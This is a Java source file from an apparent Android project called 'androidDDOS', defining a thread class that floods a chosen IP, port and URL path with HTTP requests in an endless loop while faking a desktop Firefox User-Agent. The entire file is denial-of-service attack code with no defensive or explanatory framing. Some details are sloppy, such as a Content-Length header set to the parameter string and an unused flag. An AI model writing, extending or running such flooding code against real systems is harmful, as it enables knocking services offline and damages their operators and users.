package com.a.androidDDOS;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class DDOSThread implements Runnable {
    String destinationIp;
    String protocol;
    String port;
    String url;
    String method;

    DDOSThread(String destinationIp, String protocol, String port, String url, String method) {
        this.destinationIp = destinationIp;
        this.method = method;
        this.port = port;
        this.url = url;
        this.protocol = protocol;
    }

    @Override
    public void run() {
        AtomicBoolean running = new AtomicBoolean(true);
        try {
            while (true) {
                attack(destinationIp, protocol, port, url, method);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void attack(String destinationIp, String protocol, String port, String url, String method) throws IOException {
        URL attackUrl = new URL(protocol + "://" + destinationIp + ":" + port + url);
        String param = "param1=" + java.net.URLEncoder.encode("87845", "UTF-8");
        HttpURLConnection connection = (HttpURLConnection) attackUrl.openConnection();
        connection.setDoOutput(true);
        connection.setDoInput(true);

        connection.setRequestMethod(method);
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Host", "android");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", param);
        System.out.println(this + " " + connection.getResponseCode());
        connection.getInputStream();
        connection.disconnect();
    }
}

